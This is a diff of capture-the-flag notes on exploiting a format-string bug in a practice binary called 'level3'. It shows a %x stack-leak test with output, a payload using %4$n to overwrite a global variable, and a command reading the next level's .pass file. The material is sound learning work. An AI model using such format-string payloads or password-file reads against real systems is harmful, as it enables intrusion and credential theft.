@@ -4,11 +4,11 @@ info variables
 # We can see main functiom, system, gets, printf, and 'v' call
 # Also we can see m variable which adress is 0x0804988c, maybe we'll need that later
 # let's objetdump -d level3, we can see that our m variable is used in v func
-# seem's like our binary use printf to print what we give him.
+# seem's like our binary use printf to print what we give him, we can use %x flag to print stack value
+./level3
+AAAA %x %x %x %x %x %x %x %x
+# AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520
 # After some research, I've found an exloit named format string that works with printf
-# links: https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf 
-# https://www.exploit-db.com/papers/23985
-# https://cs155.stanford.edu/papers/formatstring-1.2.pdf
 # Which allow us to write on memory with the %n
 # 0x080484da <+54>:	mov    eax,ds:0x804988c
 # 0x080484df <+59>:	cmp    eax,0x40
@@ -20,3 +20,7 @@ info variables
 (echo -e "\x8c\x98\x04\x08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%4\$n"; cat) | ./level3
 
 # cat /home/user/level4/.pass 
+# links: https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf
+# https://www.exploit-db.com/papers/23985
+# https://cs155.stanford.edu/papers/formatstring-1.2.pdf
+
